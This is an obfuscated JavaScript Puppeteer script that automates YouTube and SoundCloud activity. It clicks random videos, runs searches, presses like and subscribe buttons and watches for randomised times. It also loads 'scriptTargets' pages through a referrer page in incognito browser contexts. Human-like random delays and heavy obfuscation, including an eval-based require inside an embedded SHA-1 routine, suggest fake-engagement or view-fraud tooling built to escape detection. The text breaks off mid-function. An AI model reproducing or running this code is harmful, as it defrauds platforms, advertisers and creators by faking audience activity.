const a1 = d,
  a0 = b,
  Z = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x26e1 + -0x641 * 0x2 + -0x1a5e))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0xbb7 * -0x1 + -0x6 * -0x64b + -0x1a0b), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0xd * -0x196 + 0x941 + -0x1ddf);
    let h = e[f];
    if (c['BKSjtW'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x6ce + -0xf9d * -0x1 + -0x8cf * 0x1, r, s, t = -0x7 * 0x47f + 0x139a * 0x1 + 0xbdf; s = m['charAt'](t++); ~s && (r = q % (-0x1b8b + 0x318 + 0x1877) ? r * (0x432 * 0x9 + 0x2115 + -0x4697) + s : s, q++ % (0x61 * -0x1d + -0x1668 * 0x1 + -0x3 * -0xb23)) ? o += String['fromCharCode'](-0x1807 * 0x1 + 0xb02 * 0x3 + -0x800 & r >> (-(0x5a7 * 0x5 + -0xef0 + -0x7 * 0x1e7) * q & 0x136d + 0xd67 + -0x20ce)) : 0x19ca * -0x1 + 0x1d31 * -0x1 + -0x233 * -0x19) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1b14 * -0x1 + -0x15ff + -0x515, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1054 + -0x13c8 + 0x384))['slice'](-(0xfc + 0x3 * 0xc73 + -0x1 * 0x2653));
        }
        return decodeURIComponent(p);
      };
      c['QEBoAm'] = i, b = arguments, c['BKSjtW'] = !![];
    }
    const j = e[0x1f * -0x13 + 0x1065 + -0xe18],
      k = f + j,
      l = b[k];
    return !l ? (h = c['QEBoAm'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x107b * -0x4 + -0x866e * 0x1 + -0x37 * -0x5c6 + (-0x1807 * 0x3 + 0x1083 * 0x6 + 0x1f9b) * random()) : await standardWaitForNetIdle(f), await wait(0x5a7 * 0x5 + -0xef0 + -0x7 * -0xe3 + (0x26d9 + 0x1ace + -0x1a97) * random()), 0x19ca * -0x1 + 0x1d31 * -0x1 + -0x132 * -0x2e;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1b14 * -0x1 + -0x15ff + 0xe73), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1054 + -0x13c8 + 0x375;
}
async function randomWait() {
  return await wait(0xfc + 0x3 * 0xc73 + -0x1 * 0x12cd + (0x1f * -0x13 + 0x1065 + 0x570) * random()), 0x34 * -0x7c + 0x756 + 0x11db;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x3 * 0x6af + 0x3 * -0xd7 + -0x6b * -0x36, 0x1793 + -0x19 + -0x3 * 0x7d1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x2dff + -0x65ff * 0x1 + 0x17e5e) * getRandomInt(0x1d * -0x130 + 0x24 * -0xc1 + 0x3d96 * 0x1, 0x1bee + 0x1910 + -0x34f9), h)), -0x238c + 0x25be + -0x33 * 0xb;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xd42 * -0x2 + 0x8f0 + -0x8dd * 0x4;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x84f + 0x21de + -0x198e]['split']('\x20');
    for (let k = 0xee3 + 0x1385 + -0x2268; k < i['length']; k += 0x43d + 0x15a6 + 0x19e1 * -0x1)
      j += i[k] * h[i[k + (0x1e0 + 0x355 * -0x3 + 0x820)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x172 * 0x7 + 0x1bde + -0x11ba)['map'](l => Array['from'](l['children']))['flat'](0x4e * -0x2f + 0x1 * 0xf55 + -0x102)['map'](l => l['childNodes'][-0x11f * 0x1f + 0x27 * -0x5c + 0x821 * 0x6]['childNodes'][-0x5 * 0x7a1 + -0x5bc * 0x4 + 0x3d15]['childNodes'][0x8d3 * -0x1 + 0x1758 + -0x4 * 0x3a1]['childNodes'][0x6ff + 0x1dd0 + -0x24cf]['childNodes'][0x21f9 + 0x16c * -0xc + -0x1 * 0x10e8]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0xeb7 + 0xb60 + 0x73f, 0x1 * 0x6d + -0x1581 + -0x5c * -0x71)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x6591 + 0x1eec + 0x813d);
  const h = await getMaxTime(f),
    i = Math['min']((-0x7 * 0x2bc7 + -0x1 * -0x912e + -0x111 * -0x173) * getRandomInt(-0x16a1 + 0x206 * -0x3 + 0x1cb5, 0x140d + 0x11 * 0xf9 + -0x2491), h);
  return await wait(i), -0x752 * -0x2 + -0x238 + -0xc6b;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x18cb + -0x8e9 + 0x21b4]['children'][0x1e82 + 0x1172 + -0x5d * 0x84]['children'][0x1a * -0x92 + -0x367 * -0xa + 0x1 * -0x1332]['children'][0x254b + 0x32 + -0x257d]['children'][-0x19c * 0x11 + -0xb35 + 0x2691]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x17a2 + -0x1f2a + 0x36cd;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const R = c;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document[R(0x14) + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k[R(0xc)])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x24d3 + 0x2b0 * -0x1 + -0xa3 * 0x35 + (-0xcce + -0x1a0c + 0x270c) * random()
  }), await wait(0x5 * 0x1db + 0x1e65 + -0x25b8 + (-0x165c + -0x179 * -0x17 + -0x1 * 0xa57) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1387 + -0x269 * 0x3 + -0x2 * 0x625]['childNodes'][0x1 * -0xdc7 + 0x3d2 + -0x1 * -0x9f6]['childNodes'][-0x12e5 + -0x2 * 0x8df + 0x10c * 0x23]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1cd5 + -0x1 * 0xfb0 + 0x2c8a]['childNodes'][-0x10 * -0x7d + 0x7 * 0x395 + -0x20e3]['childNodes'][-0x5bb + 0x1369 + -0x8c * 0x19]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1403 + 0x5 * -0x9b + 0x170b),
          r = 0x1 * -0x1c12 + -0xce4 + 0xe * 0x2ed;
        for (let u = 0x13d * -0xa + -0x147c + 0x20de; u < q['length']; u += 0x1 * 0x9b5 + -0x3 * -0x15d + -0xdca)
          r += q[u] * k[q[u + (-0x380 + 0x146 * 0x10 + -0x10df)]];
        return r;
      }(n);
  });
  await wait((0x34a4 + -0x28f2 + 0x1773 * 0x2) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1 * -0x12779 + 0x4 * -0x2c0d + -0x1 * -0x731b) * getRandomInt(-0x38c * -0x7 + 0x1ec7 + -0x2 * 0x1bcd, -0x240f + 0x973 + 0x1aa6), h + (0x2 * -0xd0a + 0x1 * 0x1850 + 0x154c));
  return await wait(i), 0x887 + 0x192d + 0x21b3 * -0x1;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x4a6 + 0x6a * 0x5b + -0x2108), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2 * 0xf0b + -0x8 * 0x205 + 0x1352 * 0x3 + (-0x106b + 0x17 * -0x10f + 0x772 * 0x6) * Math['random']());
    });
  }, 0x17d3 + 0x1 * -0x129 + 0x4ae);
  await wait(-0x54c9d + 0x1 * 0x6fb67 + 0x2e516);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x16be3 + 0x59d * -0x43 + -0x1 * -0x3ce5a) * getRandomInt(0x1 * -0x1e9d + -0x1a65 + 0x3906, 0x6 * 0x266 + -0x155 * -0x1 + -0xfa0 * 0x1)), clearInterval(h), 0x1 * 0x189e + 0x5e6 + -0x1e83;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0xd * -0x196 + 0x941 + -0x1ddf);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x54c + -0x24ae + 0x29fa;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x9 * 0x152 + -0x2 * -0xb66 + -0x22ad;
    await randomWait();
  }
  return -0x19de + 0x988 + 0x1057;
}

function fetchRandomSC() {
  const S = c;
  return Math['random']() <= 0x1861 + 0x1 * -0x5fc + -0x1265 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + S(0x13) + 'ign=social' + '_sharing' : Math['random']() < 0x153e + -0xce * 0x1 + -0x1470 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = d,
      T = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1226 + 0x1 * 0x153f + 0x5 * -0x7e1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x7e * 0xc + -0xec + -0x4fc;
      if (await k[T(0x5)](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x5 * 0x45d7 + -0xefc9 * 0x1 + 0xbf31 * 0x4 + getRandomInt(-0x5c60 + 0x1 * 0x69c7 + 0x2d31, 0x951f + 0x29 * 0x233 + -0x7a1a));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x150b * -0x1 + -0xf10 + -0x4 * -0x907), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x2304 + 0x672 + -0x35 * -0x8a;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate'](U(0x3) + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1 * 0xdd9 + 0x5cc + -0x13a5, 0x28b + 0x13c0 + 0x1 * -0x1619)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x17e * 0x3 + 0x6e5 * 0x1 + 0x565 + floor((-0x24c * -0x10 + 0x2a1 * 0x1 + -0x2379) * random()))), log('p2'), log(await s['evaluate'](() => {
        const Y = b,
          V = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process[V(0x12)] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xea3f29f8 + -0x49495cac + -0x17dd661 * -0x124),
          -0xca425c + -0x87b78e + -0xae * -0x2ad93,
          0x4 * 0x370b + -0x78f4 + 0x1cc8,
          -0x7e3 * -0x3 + -0x16f2 + -0x1 * 0x37
        ], y = [
          -0x2e * -0x9e + 0x12df * -0x2 + -0xd * -0xba,
          0x2 * -0x1229 + 0x1216 * 0x2 + 0x36,
          -0xe7f + 0x99d + -0x4a * -0x11,
          0x6c5 * 0x4 + -0x1 * -0x5ff + -0x2113 * 0x1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x117e * 0x2 + 0x1d + 0x8c6 * -0x4)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x35b + 0x9 * 0x364 + -0x21df; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('const W = b;require(W(25, \'jcu8\'));'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const X = d;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N[X(0x1b) + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x677 * 0x4 + -0x1969 + -0x73) === N[X(0x1d)])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1e0c + 0x5eb + -0x3ff * 0x9] = A[0x1d * 0xd3 + -0x9e3 * -0x1 + -0x6 * 0x59f] = A[0x131 * -0x9 + -0x206e + -0x2b28 * -0x1] = A[0xe55 + 0x2613 + -0x26 * 0x161] = A[-0x74 * 0x48 + -0x339 + 0x23dc] = A[-0x1241 * 0x1 + 0x46 * 0x1 + 0x11ff] = A[0x1 * -0xfaf + 0xa9 * -0x15 + 0x1d91] = A[0xa4a * -0x1 + 0x1 * 0x1061 + -0x611] = A[-0x587 + 0x636 + -0xa8] = A[0x131d + 0x7d7 + -0x1aec] = A[-0x1475 * 0x1 + 0x2652 + -0x11d4] = A[0x40a * -0x7 + 0x26b1 + -0xa61] = A[0x1 * 0x2018 + 0xa10 + -0x2a1d] = A[0x51 * -0x5c + -0x6d2 + 0x11fd * 0x2] = A[-0x61 * 0x2e + -0x1e8b + 0x3006] = A[-0x2 * 0x2b + -0x1 * 0x14f6 + 0x6 * 0x38f] = A[-0x1 * 0x162f + 0x3 * -0x304 + -0x1e * -0x10b] = -0x24f3 + -0x1e9 * 0x14 + -0x21 * -0x247, this['blocks'] = A) : this['blocks'] = [
                -0x5b9 + 0x1e * -0xc9 + 0x1d47,
                -0x949 * -0x1 + 0x1 * -0x131e + 0x1 * 0x9d5,
                0x24ec + 0xda5 + -0x3291,
                0x14 * 0x125 + 0xe5 * -0x29 + -0x1 * -0xdc9,
                0x3aa * -0x1 + -0x9 * 0x3a6 + 0x2480,
                -0x2 * 0xd69 + -0x909 * 0x1 + -0x43 * -0x89,
                -0x55b * 0x7 + -0x15a5 * -0x1 + -0x68 * -0x27,
                -0x57a * 0x2 + -0x23b7 * -0x1 + -0x18c3,
                -0x11c + 0x2054 + -0x1b * 0x128,
                0x1b49 + 0x84 + -0x1bcd,
                -0x1cb7 + -0x5d * 0x4 + 0x1 * 0x1e2b,
                0x21dc + -0xb4 + -0x2128,
                0x1 * -0x1b32 + -0x824 + 0x11ab * 0x2,
                -0x78f * 0x1 + 0xe32 + -0x6a3,
                0x198a + -0xa99 * -0x1 + -0x2423,
                -0x1e51 + 0x2 * 0x8b3 + 0xceb,
                -0x66f + 0xede + -0x86f
              ], this['h0'] = 0x1a * -0x55e9768 + 0x5fba8169 + 0x93260228, this['h1'] = -0x12e03678 + 0x8f512cfc + 0x735cb505, this['h2'] = -0x260b2d * 0x62e + -0xc9e20a9 * -0x5 + 0x144bd49c7, this['h3'] = -0x2 * 0xe40fb2b + -0x6c44f * -0x141 + 0x1 * 0x243823bd, this['h4'] = -0x17832ff5f + -0x10ce073cf + 0x2b7 * 0x135bdd2, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xdea * 0x1 + -0xc89 * -0x3 + -0x3385, this['finalized'] = this['hashed'] = -0x21e6 * -0x1 + 0xad * 0x31 + -0x4303, this['first'] = -0x175e + -0x5d3 + 0x4a * 0x65;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xa * 0x10 + 0x77e + -0x24a * 0x3, O = J['length'] || -0x6d1 + -0x43f * 0x6 + -0x49d * -0x7, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x25a3 + 0x1 * -0x21c7 + -0x1ee * 0x2, P[0x5 * 0xc2 + -0x1202 * -0x1 + 0x3a2 * -0x6] = this['block'], P[0xf0e + 0x17c3 + -0x1 * 0x26c1] = P[0x3 * 0x1b1 + 0x15ab * -0x1 + 0x1099] = P[0x1 * 0x1d19 + 0x1c51 + -0x3968] = P[-0x2384 * 0x1 + 0x1a * -0x4a + 0x2b0b] = P[0x1e0c + 0x25b7 * -0x1 + 0x7af] = P[-0x7af + 0x1c8c + -0x14d8] = P[-0x4e2 + 0xa39 + -0x551] = P[0xc5 * -0x1a + -0x5a * -0x14 + 0xd01] = P[-0xb78 + -0x34 * 0x96 + 0x8 * 0x53f] = P[0xa23 + 0x1d46 + -0x2760] = P[-0x2448 + -0x10 * 0xff + 0x3442] = P[-0xf * -0x1a1 + -0x187 * 0xb + -0x797] = P[-0x131 * -0x16 + -0xf05 * 0x1 + -0xb25] = P[-0xfd8 + 0xa * 0x29a + 0x1 * -0xa1f] = P[0x68 * -0xe + -0x203 + 0x7c1] = P[0x19f9 + 0x15 * 0x42 + 0x5 * -0x644] = -0x3c3 * 0x7 + 0x1890 + 0x1c5), K) {
                    for (N = this['start']; M < O && N < 0xc62 + -0x3 * 0x907 + 0xef3; ++M)
                      P[N >> 0x1ed6 + 0x1a * -0xa3 + -0xe46] |= J[M] << y[-0x264f * -0x1 + -0x952 + 0x1cfa * -0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x17b1 + -0x2 * -0xde6 + -0x3 * 0x149; ++M)
                      (L = J['charCodeAt'](M)) < -0x2335 * 0x1 + 0x22f9 + 0xbc * 0x1 ? P[N >> 0x2295 + 0x794 + -0x147 * 0x21] |= L << y[0x18bd + -0x99a * 0x3 + -0x6 * -0xae & N++] : L < 0x267a + -0x2385 + 0x50b ? (P[N >> -0xc32 * 0x1 + -0x1b97 + -0x3d * -0xa7] |= (-0x2fc + -0x2 * 0x42c + 0xc14 | L >> 0x63 * -0x26 + 0xbfa + 0x2be) << y[0x11d * 0x1c + 0x2 * 0x1347 + -0x45b7 & N++], P[N >> 0x1 * -0x553 + -0xe87 + -0x4 * -0x4f7] |= (-0x1 * 0x1371 + -0x1146 + 0x7 * 0x551 | 0x567 + -0xb4c + -0x624 * -0x1 & L) << y[-0x25 * 0xd3 + -0x1f3 + 0x2075 & N++]) : L < 0x98fc + 0x33d3 * -0x2 + 0x669 * 0x1a || L >= -0x98da + 0xc7 * 0x122 + 0x976c ? (P[N >> 0x805 * -0x4 + 0x2d * -0xad + -0x3e7f * -0x1] |= (0x227 + 0x210a + 0x5 * -0x6dd | L >> -0x35e + -0x86a * 0x4 + 0x2512) << y[-0x259 * 0xd + -0x85 * 0x29 + 0x33d5 & N++], P[N >> 0x1 * 0x1885 + 0x19f5 + -0x3278] |= (0x1f * 0x133 + -0x8d2 + -0x949 * 0x3 | L >> 0x131c + -0xd70 + -0x5a6 & 0xbf6 * -0x2 + 0x1bec + -0x3c1) << y[-0x1e49 + 0x3dd * 0x3 + 0x12b5 * 0x1 & N++], P[N >> 0x323 + -0x153 + -0x1ce] |= (0x80d * -0x2 + -0xd49 + -0x445 * -0x7 | -0x1 * -0x1f20 + 0x7 * -0x581 + 0x7a6 & L) << y[-0x7fa * -0x1 + -0x11ee + 0x9f7 & N++]) : (L = 0x3738 * -0x7 + -0x2e39 + 0x2b0c1 + ((-0xa6d * -0x1 + 0xe3 * -0x18 + 0x2 * 0x76d & L) << -0x1 * -0xe77 + 0x1737 + -0x25a4 | 0x2 * -0xffd + 0x23a1 + -0x2 * -0x2c & J['charCodeAt'](++M)), P[N >> -0x1f75 + 0x4f * -0x75 + 0x4392] |= (0x7 * -0x32c + 0xe96 + 0x88e | L >> 0x230c + 0x1 * -0x141a + -0xee0) << y[0x1 * -0x2 + 0xc4f + -0xc4a & N++], P[N >> 0x67 * 0x28 + -0x7 * 0x301 + -0xb * -0x73] |= (-0xecf * 0x2 + 0xa48 * -0x3 + 0x1e7b * 0x2 | L >> -0x4 * 0x4a3 + 0x323 * 0x8 + -0x680 & 0x124f + -0x1d2f * 0x1 + -0xd * -0xdb) << y[-0x3 * 0x43a + -0x16 * -0x108 + -0x9ff & N++], P[N >> -0x5d * 0x3 + 0x2472 + -0x2359 * 0x1] |= (-0x132c + -0xe84 + 0x2230 | L >> -0xb38 + -0x3 * -0xcdf + -0x1b5f & -0x3 * -0x20 + -0x4f * -0x5d + -0x1cd4) << y[-0x43f * 0x3 + -0x628 + 0x12e8 & N++], P[N >> 0x16e + 0x2b3 * 0xe + -0x2736] |= (0x3 * 0x28f + 0x264b + 0xb5e * -0x4 | 0x15b2 * -0x1 + -0x267 + 0x1858 & L) << y[0xecb * 0x2 + -0xde8 + -0xfab & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x16f9 + 0x2529 + -0xdf0 * 0x1 ? (this['block'] = P[0x1 * -0x2638 + 0x1af2 + 0xb56], this['start'] = N - (0x8b4 + 0x1b29 + 0x3 * -0xbdf), this['hash'](), this['hashed'] = -0x7f2 * 0x2 + 0x1bf7 + -0xc12) : this['start'] = N;
                }
                return this['bytes'] > -0xf05 * 0xdbb0f + 0xd75f712f + -0x10f * -0xe93135 && (this['hBytes'] += this['bytes'] / (0xb36572b8 + -0x57e082a8 + 0x523d87f8 * 0x2) << 0x201c + 0x1869 * 0x1 + 0x35 * -0x111, this['bytes'] = this['bytes'] % (-0x6b044 * -0x476f + -0x11bb4b8bc + 0x3deb6f40)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1d44 + -0x2 * 0x384 + -0x163b;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x188d + -0x20d6 + 0x3973] = this['block'], J[K >> 0x1073 + 0x151f * 0x1 + -0x2590] |= x[-0x190e + 0xbe * -0x3 + -0x19b * -0x11 & K], this['block'] = J[0x190 + -0x48a + 0x2 * 0x185], K >= -0x1517 + 0x10d9 * 0x1 + 0x476 && (this['hashed'] || this['hash'](), J[0x5 * 0x146 + 0x1569 + -0x1bc7] = this['block'], J[0x207d + -0x1718 + 0x1 * -0x955] = J[0x587 + -0x1bf * 0x3 + -0x49] = J[-0x351 + 0x2573 + 0x27 * -0xe0] = J[0xa4 + 0x12 * 0x26 + -0x34d] = J[-0x9 * -0xba + -0x1b9a + -0x2 * -0xa8a] = J[-0x239c + -0x3 * -0x1a3 + -0x7ae * -0x4] = J[0x1187 + -0x247 + -0xf3a * 0x1] = J[0x2499 + 0x26b * -0x1 + -0x2227] = J[0xc59 + 0x790 + 0x1 * -0x13e1] = J[-0x17d3 * -0x1 + -0x4 * 0x2ed + -0xc16] = J[-0x68 * -0xa + 0x1 * 0x2267 + -0xccf * 0x3] = J[0x675 + 0x2525 + -0x2b8f] = J[0x23 * 0xb5 + -0x58f + -0x1324] = J[-0x2 * -0xb2a + -0x69 * 0x5 + 0x6 * -0x35f] = J[-0x2362 + 0x868 + 0x1b08] = J[-0x2650 + -0x3 * -0x234 + 0x1fc3] = -0x1 * 0xd65 + -0x526 * 0x5 + 0x2723), J[-0x346 * -0x7 + -0x1887 + -0x1 * -0x1ab] = this['hBytes'] << -0xaa8 + 0x5 * -0x1d9 + 0x13e8 | this['bytes'] >>> -0x1 * 0x18ab + 0x9 * 0xe3 + 0x1 * 0x10cd, J[-0x11e6 * 0x1 + 0x30 + 0x11c5] = this['bytes'] << 0x72 * -0x4d + -0xbb + 0x2308, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
